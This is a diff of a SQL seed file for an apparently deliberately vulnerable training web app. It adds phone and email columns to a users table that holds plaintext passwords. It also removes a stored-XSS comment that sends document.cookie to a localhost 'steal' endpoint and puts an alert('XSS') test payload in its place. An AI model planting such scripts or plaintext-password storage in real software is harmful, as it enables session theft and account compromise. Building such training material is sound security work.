@@ -7,8 +7,10 @@ DROP TABLE IF EXISTS SECU_USERS;
    USR_ID INT NOT NULL AUTO_INCREMENT,
    USR_LOGIN varchar(100) NOT NULL,
    USR_PWD varchar(512) NOT NULL,
-   USR_VILLE varchar(512) NULL,
+   USR_CITY varchar(512) NULL,
    USR_AGE INT NULL,
+   USR_PHONE varchar(512) NULL,
+   USR_MAIL varchar(512) NULL,
    PRIMARY KEY (USR_ID)
  ) ENGINE=InnoDB;
 
@@ -35,8 +37,8 @@ CREATE TABLE COMMENTS (
  ) ENGINE=InnoDB;
 
 
-INSERT INTO SECU_USERS (USR_ID, USR_LOGIN, USR_PWD, USR_VILLE, USR_AGE)  VALUES (1, 'alice', '123456', 'Rennes', 28);
-INSERT INTO SECU_USERS (USR_ID, USR_LOGIN, USR_PWD, USR_VILLE, USR_AGE)  VALUES (2, 'bob', 'azerty', 'Brest', 35);
+INSERT INTO SECU_USERS (USR_ID, USR_LOGIN, USR_PWD, USR_CITY, USR_AGE, USR_PHONE, USR_MAIL)  VALUES (1, 'alice', '123456', 'Rennes', 28, '0606060606', 'alice@yopmail.com');
+INSERT INTO SECU_USERS (USR_ID, USR_LOGIN, USR_PWD, USR_CITY, USR_AGE, USR_PHONE, USR_MAIL)  VALUES (2, 'bob', 'azerty', 'Brest', 35, '0601010101', 'bob@yopmail.com');
 
 INSERT INTO PRODUCT (PRD_ID, PRD_TITLE, PRD_DESCRIPTION, PRD_PRICE, PRD_IMAGE, PRD_CATEGORY, USR_ID)
 VALUES (
@@ -89,5 +91,5 @@ INSERT INTO COMMENTS (COM_ID, COM_CONTENT, PRD_ID, USR_ID)
 VALUES (1, 'Quels sont les délais max de livraison du PRODUCT ?', 100, 1);
 
 INSERT INTO COMMENTS (COM_ID, COM_CONTENT, PRD_ID, USR_ID)
-VALUES (2, 'Délicieux ces cookies !<script>new Image().src="http://localhost:8081/steal?cookies="+document.cookie</script>', 101, 2);
+VALUES (2, 'Commentaire XSS<script>alert("XSS");</script>', 104, 2);
 
